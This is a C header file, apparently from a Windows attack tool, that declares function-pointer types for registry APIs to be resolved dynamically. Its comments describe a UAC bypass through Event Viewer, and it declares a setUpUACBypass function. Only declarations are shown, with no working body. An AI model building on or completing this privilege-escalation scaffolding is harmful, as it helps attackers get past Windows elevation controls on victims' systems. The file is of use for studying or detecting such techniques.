#pragma once
#include "definitions.h"
#include "DynamicFunctionResolvers.h"
#include "winreg.h"

//Used to Query and the Create the necessary value for UAC bypass using EventViewer.
// RegConnectRegistryA - used to connect to a registry on a remote computer.
// RegOpenKeyA
// RegQueryValueExA
// RegCreateKeyExA 
// RegSetValueA
// RegSaveKeyA

//Create Function Definitions for interacting with the registry

typedef LSTATUS (WINAPI * t_RegOpenKeyA)(
	HKEY   hKey,
	LPCSTR lpSubKey,
	PHKEY  phkResult
);

typedef LSTATUS (WINAPI* t_RegQueryValueA)(
	HKEY   hKey,
	LPCSTR lpSubKey,
	LPSTR  lpData,
	PLONG  lpcbData
);

typedef LSTATUS (WINAPI* t_RegCreateKeyExA)(
	HKEY                        hKey,
	LPCSTR                      lpSubKey,
	DWORD                       Reserved,
	LPSTR                       lpClass,
	DWORD                       dwOptions,
	REGSAM                      samDesired,
	const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	PHKEY                       phkResult,
	LPDWORD                     lpdwDisposition
);

typedef LSTATUS (WINAPI* t_RegSetValueA)(
	HKEY   hKey,
	LPCSTR lpSubKey,
	DWORD  dwType,
	LPCSTR lpData,
	DWORD  cbData
);

typedef LSTATUS (WINAPI* t_RegSaveKeyA)(
	HKEY                        hKey,
	LPCSTR                      lpFile,
	const LPSECURITY_ATTRIBUTES lpSecurityAttributes
);


BOOL setUpUACBypass(const char* filePath);

